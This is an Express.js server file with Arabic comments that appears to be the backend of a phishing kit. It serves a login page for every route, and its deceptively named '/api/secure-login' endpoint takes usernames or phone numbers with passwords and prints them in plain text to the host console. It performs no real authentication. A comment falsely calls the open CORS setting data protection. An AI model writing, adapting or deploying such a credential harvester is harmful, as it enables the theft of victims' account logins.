const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000; 

// تفعيل حماية وتأمين البيانات
app.use(cors({ origin: '*' }));
app.use(express.json());

// جعل السيرفر يقرأ كافة أصول ومحتويات الواجهة من المجلد الرئيسي مباشرة
app.use(express.static(__dirname));

// مسار استقبال البيانات المربوط بالواجهة (API Endpoint)
app.post('/api/secure-login', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, error: 'برجاء ملء الحقول المطلوبة' });
    }

    // طباعة البيانات بشكل منسق في لوحة تحكم السيرفر (Render Console)
    console.log(`\n====================================`);
    console.log(`[+] بيانات مستلمة بنجاح:`);
    console.log(`[-] الحساب / الهاتف: ${username}`);
    console.log(`[-] كلمة المرور: ${password}`);
    console.log(`====================================\n`);

    res.status(200).json({ success: true, message: 'Data logged successfully' });
});

// توجيه تلقائي لعرض ملف index.html دائمًا وتفادي خطأ 404
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
